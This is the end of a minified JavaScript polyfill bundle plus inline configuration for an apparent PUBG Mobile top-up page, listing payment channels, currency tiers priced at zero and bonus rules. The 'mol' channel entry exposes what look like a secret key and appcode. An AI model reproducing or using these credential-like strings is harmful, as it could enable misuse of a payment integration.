a=e("ml72"),s=e("Sp5b"),f=e("BUlT");t.exports=function(c){return function(t,n,e){var r,o=a(t),i=s(o.length),u=f(e,i);if(c&&n!=n){for(;u<i;)if((r=o[u++])!=r)return!0}else for(;u<i;u++)if((c||u in o)&&o[u]===n)return c||u||0;return!c&&-1}}},t91x:function(t,n,e){"use strict";var r=e("OFVL"),o={};o[e("9dxi")('toStringTag')]='z',o+''!='[object z]'&&e("sU/p")(Object.prototype,'toString',function(){return'[object '+r(this)+']'},!0)},tjmq:function(t,n,e){var r=e("U1KF"),o=e("WWmS");t.exports=e("GGqZ")?function(t,n,e){return r.f(t,n,o(1,e))}:function(t,n,e){return t[n]=e,t}},uPii:function(t,n,e){"use strict";e("LEAW")('blink',function(t){return function(){return t(this,'blink','','')}})},uRBY:function(t,n,e){var a=e("mvii"),s=e("GCOZ");t.exports=function(c){return function(t,n){var e,r,o=String(s(t)),i=a(n),u=o.length;return i<0||u<=i?c?'':void 0:(e=o.charCodeAt(i))<55296||56319<e||i+1===u||(r=o.charCodeAt(i+1))<56320||57343<r?c?o.charAt(i):e:c?o.slice(i,i+2):r-56320+(e-55296<<10)+65536}}},uj7L:function(t,n,e){var r=e("X6VK"),u=e("ml72"),c=e("Sp5b");r(r.S,'String',{raw:function(t){for(var n=u(t.raw),e=c(n.length),r=arguments.length,o=[],i=0;i<e;)o.push(String(n[i++])),i<r&&o.push(String(arguments[i]));return o.join('')}})},wEu9:function(t,n){t.exports=!1},wvFD:function(t,n,e){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var u=e("E2HC");n.default=function(t,n){if(void 0===n&&(n=!1),!u.default(t))return'';var e=[];for(var r in t)if(Object.prototype.hasOwnProperty.call(t,r)&&void 0!==t[r]&&null!==t[r]){var o=n?encodeURIComponent(r):r,i=n?encodeURIComponent(t[r]):t[r];e.push(o+"="+i)}return e.join('&')}},x0AK:function(t,n,e){e("ABKx"),e("PAbq"),e("d3/y"),e("6/FK"),e("rVj0"),e("lUNa"),e("75LO"),e("3RxL"),e("Kz8+"),e("HZro"),e("b3pB"),e("cljR"),e("imLM"),e("PJhk"),e("5hJT"),e("LAIM"),e("1qKx"),e("t91x"),t.exports=e("R5TD").Object},yIlq:function(t,n,e){"use strict";var r=e("X6VK"),o=e("1wfo")(1);r(r.P+r.F*!e("/6rt")([].map,!0),'Array',{map:function(t,n){return o(this,t,n)}})},yMpN:function(t,n,e){e("zSai"),e("uj7L"),e("m8zh"),e("lQyR"),e("ao5+"),e("BDzi"),e("6d4m"),e("NhxO"),e("FEHE"),e("dtzt"),e("WppA"),e("uPii"),e("f9rF"),e("BTfu"),e("htXQ"),e("S75U"),e("Jqo+"),e("ScpY"),e("XQs+"),e("qeoz"),e("Ndiv"),e("4enF"),e("9ovy"),e("Z8gF"),e("nsbO"),e("asZ9"),t.exports=e("R5TD").String},z6KD:function(t,n,e){var r=e("P56o"),o=e("R5TD"),i=e("wEu9"),u=e("fxUj"),c=e("U1KF").f;t.exports=function(t){var n=o.Symbol||(o.Symbol=!i&&r.Symbol||{});'_'==t.charAt(0)||t in n||c(n,t,{value:u.f(t)})}},"zIP/":function(t,n,e){function r(t){c(t,o,{value:{i:'O'+ ++a,w:{}}})}var o=e("1Alt")('meta'),i=e("Bsg+"),u=e("ezc+"),c=e("U1KF").f,a=0,s=Object.isExtensible||function(){return!0},f=!e("E7Vc")(function(){return s(Object.preventExtensions({}))}),l=t.exports={KEY:o,NEED:!1,fastKey:function(t,n){if(!i(t))return'symbol'==typeof t?t:('string'==typeof t?'S':'P')+t;if(!u(t,o)){if(!s(t))return'F';if(!n)return'E';r(t)}return t[o].i},getWeak:function(t,n){if(!u(t,o)){if(!s(t))return!0;if(!n)return!1;r(t)}return t[o].w},onFreeze:function(t){return f&&l.NEED&&s(t)&&!u(t,o)&&r(t),t}}},zIds:function(t,n,e){var r=e("at5L"),o=e("fQty").concat('length','prototype');n.f=Object.getOwnPropertyNames||function(t){return r(t,o)}},zSai:function(t,n,e){var r=e("X6VK"),i=e("BUlT"),u=String.fromCharCode,o=String.fromCodePoint;r(r.S+r.F*(!!o&&1!=o.length),'String',{fromCodePoint:function(t){for(var n,e=[],r=arguments.length,o=0;o<r;){if(n=+arguments[o++],i(n,1114111)!==n)throw RangeError(n+' is not a valid code point');e.push(n<65536?u(n):u(55296+((n-=65536)>>10),n%1024+56320))}return e.join('')}})},zlqh:function(t,n,e){var i=e("9dxi")('iterator'),u=!1;try{var r=[7][i]();r.return=function(){u=!0},Array.from(r,function(){throw 2})}catch(t){}t.exports=function(t,n){if(!n&&!u)return!1;var e=!1;try{var r=[7],o=r[i]();o.next=function(){return{done:e=!0}},r[i]=function(){return o},t(r)}catch(t){}return e}}});
	</script>
	<script type="text/javascript">
    var GAME_INFO = {
    "offer_name": "PUBG Mobile",
    "unit": "UnknownCash",
    "rate": "10",
    "count": "0",
    "country_code": "ID",
    "currency_type": "",
    "channel": [{
        "id": "os_credit_card",
        "name": "",
        "key": "",
        "appcode": "",
        "service_id": "",
        "pay_channel": {}
    }, {
        "id": "creditcard",
        "name": "",
        "key": "",
        "appcode": "",
        "service_id": "",
        "pay_channel": {}
    }, {
        "id": "os_adyen",
        "name": "",
        "key": "",
        "appcode": "",
        "service_id": "",
        "pay_channel": {}
    }, {
        "id": "mol",
        "name": "",
        "key": "poSZb92qoFgpqavNyD6oifsRhbhNGz7C",
        "appcode": "SRAHw9dTRiMSTvYq1g6RLIVuNwNqg27f",
        "service_id": "",
        "pay_channel": {}
    }, {
        "id": "midas_redeem",
        "name": "",
        "key": "",
        "appcode": "",
        "service_id": "",
        "pay_channel": {}
    }, {
        "id": "redeem",
        "name": "",
        "key": "",
        "appcode": "",
        "service_id": "",
        "pay_channel": {}
    }, {
        "id": "mol_zgoldcard",
        "name": "",
        "key": "",
        "appcode": "",
        "service_id": "",
        "pay_channel": {}
    }, {
        "id": "mol_razerzvault",
        "name": "",
        "key": "",
        "appcode": "",
        "service_id": "",
        "pay_channel": {}
    }],
    "productid_list": [{
        "id": "os_credit_card",
        "productid_info": [{
            "name": "60 Unknow Cash",
            "product_detail": "",
            "productid": "os_credit_card_OT_60",
            "price": "0",
            "num": "60",
            "currency_type": "USD",
            "country": "OT"
        }, {
            "name": "300 Unknow Cash",
            "product_detail": "",
            "productid": "os_credit_card_OT_300",
            "price": "0",
            "num": "300",
            "currency_type": "USD",
            "country": "OT"
        }, {
            "name": "600 Unknow Cash",
            "product_detail": "",
            "productid": "os_credit_card_OT_600",
            "price": "0",
            "num": "600",
            "currency_type": "USD",
            "country": "OT"
        }, {
            "name": "1500 Unknow Cash",
            "product_detail": "",
            "productid": "os_credit_card_OT_1500",
            "price": "0",
            "num": "1500",
            "currency_type": "USD",
            "country": "OT"
        }, {
            "name": "3000 Unknow Cash",
            "product_detail": "",
            "productid": "os_credit_card_OT_3000",
            "price": "0",
            "num": "3000",
            "currency_type": "USD",
            "country": "OT"
        }, {
            "name": "6000 Unknow Cash",
            "product_detail": "",
            "productid": "os_credit_card_OT_6000",
            "price": "0",
            "num": "6000",
            "currency_type": "USD",
            "country": "OT"
        }]
    }, {
        "id": "mol_zgoldcard",
        "productid_info": [{
            "name": "60 Unknown Cash",
            "product_detail": "",
            "productid": "mol_zgoldcard_OT_60",
            "price": "0",
            "num": "60",
            "currency_type": "USD",
            "country": "OT"
        }, {
            "name": "120 Unknown Cash",
            "product_detail": "",
            "productid": "mol_zgoldcard_OT_120",
            "price": "0",
            "num": "120",
            "currency_type": "USD",
            "country": "OT"
        }, {
            "name": "300 Unknown Cash",
            "product_detail": "",
            "productid": "mol_zgoldcard_OT_300",
            "price": "0",
            "num": "300",
            "currency_type": "USD",
            "country": "OT"
        }, {
            "name": "600 Unknown Cash",
            "product_detail": "",
            "productid": "mol_zgoldcard_OT_600",
            "price": "0",
            "num": "600",
            "currency_type": "USD",
            "country": "OT"
        }, {
            "name": "1200 Unknown Cash",
            "product_detail": "",
            "productid": "mol_zgoldcard_OT_1200",
            "price": "0",
            "num": "1200",
            "currency_type": "USD",
            "country": "OT"
        }, {
            "name": "1500 Unknown Cash",
            "product_detail": "",
            "productid": "mol_zgoldcard_OT_1500",
            "price": "0",
            "num": "1500",
            "currency_type": "USD",
            "country": "OT"
        }, {
            "name": "3000 Unknown Cash",
            "product_detail": "",
            "productid": "mol_zgoldcard_OT_3000",
            "price": "0",
            "num": "3000",
            "currency_type": "USD",
            "country": "OT"
        }, {
            "name": "6000 Unknown Cash",
            "product_detail": "",
            "productid": "mol_zgoldcard_OT_6000",
            "price": "0",
            "num": "6000",
            "currency_type": "USD",
            "country": "OT"
        }]
    }, {
        "id": "mol_razerzvault",
        "productid_info": [{
            "name": "60 Unknown Cash",
            "product_detail": "",
            "productid": "mol_razerzvault_OT_60",
            "price": "0",
            "num": "60",
            "currency_type": "USD",
            "country": "OT"
        }, {
            "name": "180 Unknown Cash",
            "product_detail": "",
            "productid": "mol_razerzvault_OT_180",
            "price": "0",
            "num": "180",
            "currency_type": "USD",
            "country": "OT"
        }, {
            "name": "600 Unknown Cash",
            "product_detail": "",
            "productid": "mol_razerzvault_OT_600",
            "price": "0",
            "num": "600",
            "currency_type": "USD",
            "country": "OT"
        }, {
            "name": "1500 Unknown Cash",
            "product_detail": "",
            "productid": "mol_razerzvault_OT_1500",
            "price": "0",
            "num": "1500",
            "currency_type": "USD",
            "country": "OT"
        }, {
            "name": "3000 Unknown Cash",
            "product_detail": "",
            "productid": "mol_razerzvault_OT_3000",
            "price": "0",
            "num": "3000",
            "currency_type": "USD",
            "country": "OT"
        }, {
            "name": "6000 Unknown Cash",
            "product_detail": "",
            "productid": "mol_razerzvault_OT_6000",
            "price": "0",
            "num": "6000",
            "currency_type": "USD",
            "country": "OT"
        }]
    }],
    "mol_pin_show_info": [],
    "pmwall_card": {},
    "appmode": 0,
    "max_num": 0,
    "productid": "",
    "goodsname": "",
    "goodsdes": "",
    "unit_price": "",
    "pmwall_cc": "",
    "short_openid": "",
    "charac_name": "",
    "logic_world_list": "",
    "mycard_info": {},
    "openid": "",
    "adyen_svrtime": "",
    "adyen_url": "",
    "pass_is_buy": "",
    "last_login_time": ""
};
var MP_INFO = {
    "buycurrency": {
        "uptopresent_ot": {
            "rule_item": [{
                "present_item": [{
                    "num": "60",
                    "send_type": "2",
                    "send_rate": "0",
                    "send_num": "3",
                    "send_ext": "",
                    "product_item": []
                }, {
                    "num": "120",
                    "send_type": "2",
                    "send_rate": "0",
                    "send_num": "8",
                    "send_ext": "",
                    "product_item": []
                }, {
                    "num": "300",
                    "send_type": "2",
                    "send_rate": "0",
                    "send_num": "40",
                    "send_ext": "",
                    "product_item": []
                }, {
                    "num": "600",
                    "send_type": "2",
                    "send_rate": "0",
                    "send_num": "90",
                    "send_ext": "",
                    "product_item": []
                }, {
                    "num": "1200",
                    "send_type": "2",
                    "send_rate": "0",
                    "send_num": "260",
                    "send_ext": "",
                    "product_item": []
                }, {
                    "num": "1500",
                    "send_type": "2",
                    "send_rate": "0",
                    "send_num": "375",
                    "send_ext": "",
                    "product_item": []
                }, {
                    "num": "3000",
                    "send_type": "2",
                    "send_rate": "0",
                    "send_num": "1000",
                    "send_ext": "",
                    "product_item": []
                }, {
                    "num": "6000",
                    "send_type": "2",
                    "send_rate": "0",
                    "send_num": "2400",
                    "send_ext": "",
                    "product_item": []
                }],
                "allow_channel": "mol:1003",
                "currency_type": "*",
                "currency_zone": "*",
                "begin_time": "2020-01-14 17:00:00",
                "end_time": "2022-07-17 23:59:59",
                "rank_type": "range",
                "is_limit": "no",
                "desc": ""
            }, {
                "present_item": [{
                    "num": "60",
                    "send_type": "2",
                    "send_rate": "0",
                    "send_num": "3",
                    "send_ext": "",
                    "product_item": []
                }, {
                    "num": "180",
                    "send_type": "2",
                    "send_rate": "0",
                    "send_num": "18",
                    "send_ext": "",
                    "product_item": []
                }, {
                    "num": "600",
                    "send_type": "2",
                    "send_rate": "0",
                    "send_num": "90",
                    "send_ext": "",
                    "product_item": []
                }, {
                    "num": "1500",
                    "send_type": "2",
                    "send_rate": "0",
                    "send_num": "375",
                    "send_ext": "",
                    "product_item": []
                }, {
                    "num": "3000",
                    "send_type": "2",
                    "send_rate": "0",
                    "send_num": "1000",
                    "send_ext": "",
                    "product_item": []
                }, {
                    "num": "6000",
                    "send_type": "2",
                    "send_rate": "0",
                    "send_num": "2400",
                    "send_ext": "",
                    "product_item": []
                }],
                "allow_channel": "mol:27,mol:1001",
                "currency_type": "*",
                "currency_zone": "*",
                "begin_time": "2020-01-14 17:00:00",
                "end_time": "2022-07-17 23:59:59",
                "rank_type": "range",
                "is_limit": "no",
                "desc": ""
            }, {
                "present_item": [{
                    "num": "60",
                    "send_type": "2",
                    "send_rate": "0",
                    "send_num": "3",
                    "send_ext": "",
                    "product_item": []
                }, {
                    "num": "300",
                    "send_type": "2",
                    "send_rate": "0",
                    "send_num": "40",
                    "send_ext": "",
                    "product_item": []
                }, {
                    "num": "600",
                    "send_type": "2",
                    "send_rate": "0",
                    "send_num": "90",
                    "send_ext": "",
                    "product_item": []
                }, {
                    "num": "1500",
                    "send_type": "2",
                    "send_rate": "0",
                    "send_num": "375",
                    "send_ext": "",
                    "product_item": []
                }, {
                    "num": "3000",
                    "send_type": "2",
                    "send_rate": "0",
                    "send_num": "1000",
                    "send_ext": "",
                    "product_item": []
                }, {
                    "num": "6000",
                    "send_type": "2",
                    "send_rate": "0",
                    "send_num": "2400",
                    "send_ext": "",
                    "product_item": []
                }],
                "allow_channel": "os_adyen:4,os_credit_card",
                "currency_type": "*",
                "currency_zone": "*",
                "begin_time": "2020-01-14 17:00:00",
                "end_time": "2022-07-17 23:59:59",
                "rank_type": "range",
                "is_limit": "no",
                "desc": ""
            }],
            "title": "",
            "rule_id": "utp200102220832287"
        },
        "ruleset_id": "DRM200716000000075808",
        "mall_url": "",
        "result_url": "",
        "title": "",
        "title_url": ""
    }
};
var CHANNEL_INFO = {
    "adyen_wechat": {
        "channel": "adyen",
        "cssObj": {
            "height": 200,
            "width": 200
        },
        "currencyType": ["CNY", "HKD", "USD"],
        "icon_h5": "https://midas.gtimg.cn/overseaspay/images/adyen/wechat.png",
        "icon_pc": "https://midas.gtimg.cn/overseaspay/images/adyen/wechat.png",
        "icon_pc_2": "https://midas.gtimg.cn/overseaspay/images/adyen/wechat.png",
        "isAdyen": 1,
        "name": "Wechat",
        "payParams": {
            "channel": "adyen",
            "newtab": 0,
            "subchannel": "wechat",
            "wf_info": "return_qrcode=true"
        },
        "pm": "os_adyen:2",
        "return_qrcode": true
    },
    "codapay_kh_dcb": {
        "channel": "codapay",
        "currencyType": ["USD"],
        "icon_h5": "https://midas.gtimg.cn/oversea_web/static/images/paybyMobile.jpg",
        "icon_pc": "https:https://midas.gtimg.cn/store_config/1591583533634a96yRIdB.png",
        "name": "Pay By Mobile",
        "pm": "os_codapay:27",
        "subchannel": "dcb"
    },
    "codapay_kh_wing": {
        "channel": "codapay",
        "currencyType": ["USD"],
        "icon_h5": "https://midas.gtimg.cn/overseaspay/images/codapay/mo_cnl_wing_logo.jpg",
        "icon_pc": "https://midas.gtimg.cn/overseaspay/images/codapay/pc_cnl_wing_logo.jpg",
        "icon_pc_2": "https://midas.gtimg.cn/overseaspay/images/codapay/pc_cnl_wing_logo@2x.jpg",
        "name": "WING",
        "pm": "os_codapay:28",
        "subchannel": "wing"
    },
    "midas_redeem": {
        "currencyType": ["INR", "IDR", "USD", "TRY", "IQD", "KWD", "SAR", "BHD", "QAR", "AED", "OMR", "EGP", "LYD", "TND", "DZD", "MAD", "LAK", "MYR", "MMK", "PHP", "SGD", "THB"],
        "icon_h5": "https://midas.gtimg.cn/overseaspay/images/public/redeem_code_mo.png",
        "icon_pc": "https://midas.gtimg.cn/overseaspay/images/public/redeem_code.png",
        "name": "Voucher Code",
        "pm": "redeem"
    },
    "mol_fpx": {
        "channel": "mol_global",
        "currencyType": ["AUD", "BRL", "IDR", "INR", "MYR", "NZD", "PHP", "SGD", "THB", "TWD", "USD", "VND"],
        "icon_h5": "https://midas.gtimg.cn/oversea_web/static/images/FPX.png",
        "icon_pc": "https://midas.gtimg.cn/oversea_web/static/images/FPX.png",
        "name": "FPX",
        "pm": "mol:12",
        "subchannel": "mol_fpx"
    },
    "mol_gamesultan": {
        "channel": "mol_global",
        "currencyType": ["TRY", "EUR", "USD"],
        "icon_h5": "",
        "icon_pc": "",
        "icon_pc_2": "",
        "name": "gamesultan",
        "pm": "mol:9",
        "subchannel": "mol_gamesultan"
    },
    "mol_maybank2u": {
        "channel": "mol_global",
        "currencyType": ["AUD", "BRL", "IDR", "INR", "MYR", "NZD", "PHP", "SGD", "THB", "TWD", "USD", "VND"],
        "icon_h5": "",
        "icon_pc": "",
        "icon_pc_2": "",
        "name": "maybank2u",
        "pm": "mol:13",
        "subchannel": "mol_maybank2u"
    },
    "mol_molpaycreditcard": {
        "channel": "mol_global",
        "currencyType": ["AUD", "BRL", "IDR", "INR", "MYR", "NZD", "PHP", "SGD", "THB", "TWD", "USD", "VND"],
        "icon_h5": "",
        "icon_pc": "",
        "icon_pc_2": "",
        "name": "molpaycreditcard",
        "pm": "mol:10",
        "subchannel": "mol_molpaycreditcard"
    },
    "mol_paypal": {
        "channel": "mol_global",
        "currencyType": ["AUD", "BRL", "IDR", "INR", "MYR", "NZD", "PHP", "SGD", "THB", "TWD", "USD", "VND"],
        "icon_h5": "",
        "icon_pc": "",
        "icon_pc_2": "",
        "name": "paypal",
        "pm": "mol:11",
        "subchannel": "mol_paypal"
    },
    "mol_razerzvault": {
        "channel": "mol_global",
        "currencyType": ["AUD", "BRL", "EUR", "HKD", "IDR", "INR", "MYR", "NZD", "PHP", "SGD", "THB", "TWD", "USD", "VND", "TRY", "MMK", "MXN", "HKD"],
        "icon_h5": "https://midas.gtimg.cn/oversea_web/static/images/Razer_Gold.png",
        "icon_pc": "https://midas.gtimg.cn/oversea_web/static/images/mol/razergold_logo.png",
        "icon_pc_2": "",
        "name": "Razer Gold ",
        "pm": "mol:27",
        "subchannel": "mol_razerzvault"
    },
    "mol_rixty": {
        "channel": "mol_global",
        "currencyType": ["BRL", "USD"],
        "icon_h5": "",
        "icon_pc": "",
        "icon_pc_2": "",
        "name": "rixty",
        "pm": "mol:1002",
        "subchannel": "mol_rixty"
    },
    "mol_zgoldcard": {
        "channel": "mol_global",
        "currencyType": ["AUD", "BRL", "EUR", "HKD", "IDR", "INR", "MYR", "NZD", "PHP", "SGD", "THB", "TWD", "USD", "VND", "MXN", "TRY", "MMK", "HKD"],
        "icon_h5": "https://midas.gtimg.cn/oversea_web/static/images/mol/razergold_logo.png",
        "icon_pc": "https://midas.gtimg.cn/oversea_web/static/images/mol/razergold_logo.png",
        "name": "Razer Gold Pin",
        "pm": "mol:1003",
        "subchannel": "mol_zgoldcard",
        "type": "cashcard"
    },
    "mol_zgoldewallet": {
        "channel": "mol_global",
        "currencyType": ["AUD", "BRL", "EUR", "HKD", "IDR", "INR", "MYR", "NZD", "PHP", "SGD", "THB", "TWD", "USD", "MXN", "VND"],
        "icon_h5": "https://midas.gtimg.cn/overseaspay/images/mol_global/mo_cnl_zgold_molpoints.png",
        "icon_pc": "https://midas.gtimg.cn/overseaspay/images/mol_global/pc_cnl_zgold_molpoints.png",
        "icon_pc_2": "https://midas.gtimg.cn/overseaspay/images/mol_global/pc_cnl_zgold_molpoints@2x.png",
        "name": "e-Wallet",
        "pm": "mol:1001",
        "subchannel": "mol_zgoldewallet"
    },
    "os_boacompra": {
        "channel": "boacompra",
        "currencyType": ["BRL", "TRY", "MXN", "USD"],
        "icon_h5": "https://midas.gtimg.cn/overseaspay/images/boacompra.png",
        "icon_pc": "https://midas.gtimg.cn/overseaspay/images/boacompra.png",
        "name": "Boacompra",
        "pm": "os_boacompra",
        "subchannel": ""
    },
    "os_boacompra_card": {
        "channel": "boacompra",
        "currencyType": ["BRL", "MXN", "TRY", "USD"],
        "icon_h5": "https://midas.gtimg.cn/overseaspay/images/boacompra.png",
        "icon_pc": "https://midas.gtimg.cn/overseaspay/images/boacompra.png",
        "imgs": ["https://midas.gtimg.cn/boacompra/credit_card/visa.png", "https://midas.gtimg.cn/boacompra/credit_card/mastercard.png", "https://midas.gtimg.cn/boacompra/credit_card/americanexpress.png", "https://midas.gtimg.cn/boacompra/credit_card/visaelectron.png", "https://midas.gtimg.cn/boacompra/credit_card/diners.png", "https://midas.gtimg.cn/boacompra/credit_card/hipercard.png", "https://midas.gtimg.cn/boacompra/credit_card/aura.png", "https://midas.gtimg.cn/boacompra/credit_card/elocard.png", "https://midas.gtimg.cn/boacompra/credit_card/personal.png", {
            "mx": ["https://midas.gtimg.cn/store_config/1599471336824UvemwojK.png", "https://midas.gtimg.cn/store_config/1599471350879ezAGOlbO.png", "https://midas.gtimg.cn/store_config/1599471367380rtokLPZy.png"],
            "tr": ["https://midas.gtimg.cn/boacompra/credit_card/visa.png", "https://midas.gtimg.cn/boacompra/credit_card/mastercard.png", "https://midas.gtimg.cn/boacompra/credit_card/visaelectron.png", "https://midas.gtimg.cn/boacompra/credit_card/maestro.png"]
        }],
        "name": "Card",
        "payParams": {
            "channel": "boacompra",
            "payment_group": "card",
            "subchannel": "card"
        },
        "pm": "os_boacompra"
    },
    "os_boacompra_cash": {
        "channel": "boacompra",
        "currencyType": ["BRL", "MXN", "TRY", "USD"],
        "icon_h5": "https://midas.gtimg.cn/overseaspay/images/boacompra.png",
        "icon_pc": "https://midas.gtimg.cn/overseaspay/images/boacompra.png",
        "imgs": [{
            "br": ["https://midas.gtimg.cn/boacompra/cash/boleto.png"],
            "mx": ["https://midas.gtimg.cn/store_config/1599469782213uvTvpgio.png", "https://midas.gtimg.cn/store_config/1599469829601bNmlIQU.png", "https://midas.gtimg.cn/store_config/1599469846005mxPrxulJ.png"]
        }],
        "name": "Cash",
        "payParams": {
            "channel": "boacompra",
            "payment_group": "cash",
            "subchannel": "cash"
        },
        "pm": "os_boacompra"
    },
    "os_boacompra_transfer": {
        "channel": "boacompra",
        "currencyType": ["BRL", "MXN", "TRY", "USD"],
        "icon_h5": "https://midas.gtimg.cn/overseaspay/images/boacompra.png",
        "icon_pc": "https://midas.gtimg.cn/overseaspay/images/boacompra.png",
        "imgs": ["https://midas.gtimg.cn/boacompra/bank_transfer/bancodobrasil.png", "https://midas.gtimg.cn/boacompra/bank_transfer/itau.png", "https://midas.gtimg.cn/boacompra/bank_transfer/banrisul.png", "https://midas.gtimg.cn/boacompra/bank_transfer/santander.png", "https://midas.gtimg.cn/boacompra/bank_transfer/bradesco.png", "https://midas.gtimg.cn/boacompra/bank_transfer/caixa.png", {
            "br": ["https://midas.gtimg.cn/store_config/1599470452089hr67AhtV.png", "https://midas.gtimg.cn/store_config/1599470491830w6ybRbBL.png", "https://midas.gtimg.cn/store_config/1599470517784l4C7bG3R.png", "https://midas.gtimg.cn/store_config/1599470538002ErB0xqb3.png"],
            "mx": ["https://midas.gtimg.cn/store_config/1599470891891WVjmmVZv.png", "https://midas.gtimg.cn/store_config/1599470910934LpErPYzr.jpg", "https://midas.gtimg.cn/store_config/1599470959778qwiV6VWR.png", "https://midas.gtimg.cn/store_config/1599470985697qvSbBE7g.jpg", "https://midas.gtimg.cn/store_config/1599471060834hyELBEj.jpg", "https://midas.gtimg.cn/store_config/1599471079298iOYylAlq.png", "https://midas.gtimg.cn/store_config/1599471095318MZm94mDE.png"],
            "tr": ["https://midas.gtimg.cn/boacompra/bank_transfer/isbank.png", "https://midas.gtimg.cn/boacompra/bank_transfer/granti.png", "https://midas.gtimg.cn/boacompra/bank_transfer/akbank.png", "https://midas.gtimg.cn/boacompra/bank_transfer/yapikredi.png", "https://midas.gtimg.cn/boacompra/bank_transfer/denizbank.png", "https://midas.gtimg.cn/boacompra/bank_transfer/ptt.png", "https://midas.gtimg.cn/boacompra/bank_transfer/kuveytturk.png", "https://midas.gtimg.cn/boacompra/bank_transfer/vakifbank.png", "https://midas.gtimg.cn/boacompra/bank_transfer/ziraatbankasi.png", "https://midas.gtimg.cn/boacompra/bank_transfer/teconomibank.png"]
        }],
        "name": "Transfer",
        "payParams": {
            "channel": "boacompra",
            "payment_group": "transfer",
            "subchannel": "transfer"
        },
        "pm": "os_boacompra"
    },
    "os_boacompra_wallet": {
        "channel": "boacompra",
        "currencyType": ["BRL", "MXN", "TRY", "USD"],
        "icon_h5": "https://midas.gtimg.cn/overseaspay/images/boacompra.png",
        "icon_pc": "https://midas.gtimg.cn/overseaspay/images/boacompra.png",
        "imgs": ["https://midas.gtimg.cn/boacompra/online_wallet/gold.png", "https://midas.gtimg.cn/boacompra/online_wallet/pagseguro.png", "https://midas.gtimg.cn/boacompra/online_wallet/paypal.png", {
            "br": ["https://midas.gtimg.cn/store_config/1599471567752tfaaKPWp.png", "https://midas.gtimg.cn/store_config/1599471586017hznUaVqi.png"],
            "mx": ["https://midas.gtimg.cn/store_config/1599471586017hznUaVqi.png"]
        }],
        "name": "Wallet",
        "payParams": {
            "channel": "boacompra",
            "payment_group": "online wallet",
            "subchannel": "wallet"
        },
        "pm": "os_boacompra"
    },
    "os_paypal": {
        "currencyType": ["AUD", "BRL", "CAD", "CZK", "DKK", "EUR", "HKD", "HUF", "INR", "ILS", "JPY", "MYR", "MXN", "TWD", "NZD", "NOK", "PHP", "PLN", "GBP", "RUB", "SGD", "SEK", "CHF", "THB", "USD"],
        "icon_h5": "https://midas.gtimg.cn/overseaspay/images/public/logo_paypal.png",
        "icon_pc": "https://midas.gtimg.cn/overseaspay/images/public/logo_paypal.png",
        "name": "PayPal",
        "payParams": {
            "channel": "paypal_new",
            "newtab": 1
        },
        "pm": "os_paypal"
    },
    "os_skrill": {
        "currencyType": ["EUR", "USD", "GBP", "SEK", "AED", "SAR", "KWD", "RUB", "TRY"],
        "icon_h5": "https://midas.gtimg.cn/oversea_web/static/images/mobile/skrill-m.62dcdbf08812727a737fa6af2f65a137.png",
        "icon_pc": "https://midas.gtimg.cn/oversea_web/static/images/skrill-PC.48a4f4f335451c3d629ca79151718d52.png",
        "name": "Skrill",
        "payParams": {
            "channel": "skrill",
            "newtab": 1
        },
        "pm": "os_skrill"
    },
    "paypal": {
        "currencyType": ["USD"],
        "icon_h5": "https://midas.gtimg.cn/oversea_web/static/images/mobile/paypal.808e77fba15f2d5ab2cc2d600b34d20a.png",
        "icon_pc": "https://midas.gtimg.cn/oversea_web/static/images/paypal.742e7f5cf90d09e4b21f8a53ea4ff9f5.png",
        "name": "Paypal",
        "pm": "paypal:1"
    },
    "wechat": {
        "H5_frameHeight": "200",
        "channel": "",
        "cssObj": {
            "height": 200,
            "width": 200
        },
        "currencyType": ["CNY", "HKD", "USD"],
        "icon_h5": "https://midas.gtimg.cn/overseaspay/images/wechat/wechat.png",
        "icon_pc": "https://midas.gtimg.cn/overseaspay/images/wechat/wechat.png",
        "icon_pc_2": "https://midas.gtimg.cn/overseaspay/images/wechat/wechat.png",
        "isWechat": 1,
        "name": "微信支付",
        "payParams": {
            "channel": "wechat",
            "h5_newtab": 0,
            "pc_newtab": 0,
            "subchannel": ""
        },
        "pm": "wechat",
        "supportJsApi": 1
    },
    "os_credit_card": {
        "channel": "creditcard",
        "currencyType": ["SEK", "EUR", "PLN", "THB", "EGP", "MMK", "INR", "HKD", "BRL", "IDR", "USD", "PKR", "LAK", "TWD", "TRY", "IQD", "PHP", "MYR", "SGD", "MMK", "EGP", "INR", "HKD", "ILS", "SGD", "SAR", "AED", "KWD", "AUD", "RUB", "CHF", "GBP", "EUR", "QAR", "BHD", "MXN", "ZAR", "OMR", "LKR", "KZT"],
        "icon_h5": "https://midas.gtimg.cn/oversea_web/static/images/card_icon.png",
        "icon_pc": "https://midas.gtimg.cn/store_config/1591583418114fLuXpvL7.png",
        "icon_pc_2": "https://midas.gtimg.cn/store_config/1591583418114fLuXpvL7.png",
        "imgs": ["https://midas.gtimg.cn/oversea_web/static/images/creditcard/visa.png", "https://midas.gtimg.cn/oversea_web/static/images/creditcard/mastercard.png", "https://midas.gtimg.cn/store_config/1591840311202NFEY8rsl.jpg", "https://midas.gtimg.cn/store_config/1590388413020SZ0HsR7C.png", "https://midas.gtimg.cn/store_config/1590388424133LAvOXFfg.png", "https://midas.gtimg.cn/store_config/15903884360138E9JgZLy.png", "https://midas.gtimg.cn/store_config/1590388448535nq1ckDsi.png"],
        "name": "Card",
        "payParams": {
            "action": "pay",
            "needAvs": false
        },
        "pm": "os_credit_card:1"
    },
    "codapay_kh_pipay": {
        "channel": "codapay",
        "currencyType": ["USD"],
        "icon_h5": "https://midas.gtimg.cn/oversea_web/static/images/paybyMobile.jpg",
        "icon_pc": "https:https://midas.gtimg.cn/store_config/1591583533634a96yRIdB.png",
        "name": "pipay",
        "pm": "os_codapay:48",
        "subchannel": "pipay"
    },
    "mol_paysafecard": {
        "channel": "mol_global",
        "currencyType": ["MXN", "USD", "CAD"],
        "icon_h5": "",
        "icon_pc": "",
        "icon_pc_2": "",
        "name": "Paysafecard",
        "pm": "mol:107",
        "subchannel": "mol_paysafecard"
    }
};
window.noComplianceCountryList = ["VN", "VNG"];
window.complianceWithBirthCountryList = ["AT", "BE", "BG", "HR", "CY", "CZ", "DK", "EE", "FI", "FR", "DE", "GR", "HU", "IE", "IT", "LV", "LT", "LU", "MT", "NL", "PL", "PT", "RO", "SK", "SI", "ES", "SE", "GB", "IS", "LI", "NO", "CH", "IN", "KR", "RU", "TR", "US", "OT"];
